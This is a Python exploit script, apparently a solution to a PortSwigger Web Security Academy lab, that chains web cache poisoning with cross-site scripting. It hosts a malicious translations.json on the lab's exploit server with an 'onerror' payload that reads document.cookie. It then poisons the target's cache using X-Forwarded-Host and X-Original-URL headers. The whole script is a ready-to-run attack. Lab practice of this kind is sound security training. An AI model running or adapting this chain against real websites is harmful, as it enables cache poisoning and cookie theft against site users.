import http.client
import sys
import requests
import re

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]

session = requests.Session()

response = session.get(burp_url)
exploit_server = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text).group(0)

burp_data = {"urlIsHttps": "on", "responseFile": "/resources/json/translations.json", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: application/javascript; charset=utf-8\r\nAccess-Control-Allow-Origin: *", "responseBody": "{\r\n    \"en\": {\r\n        \"name\": \"English\"\r\n    },\r\n    \"es\": {\r\n        \"name\": \"espa\xc3\xb1ol\",\r\n        \"translations\": {\r\n            \"Return to list\": \"Volver a la lista\",\r\n            \"View details\": \"</a><img src=1 onerror='alert(document.cookie)' />\",\r\n            \"Description:\": \"Descripci\xc3\xb3n\"\r\n        }\r\n    }\r\n}", "formAction": "STORE"}
session.post(exploit_server, data=burp_data)

session.get(burp_url)

conn = http.client.HTTPSConnection(burp_url[8:])

headers = {'X-Forwarded-Host': exploit_server[8:]}

conn.request("GET", '/?localized=1' ,headers=headers)
response = conn.getresponse()

headers_ = {'X-Original-URL': '/setlang\es'}

for _ in range(5):
    conn.request("GET", '/' ,headers=headers_)
    response = conn.getresponse()
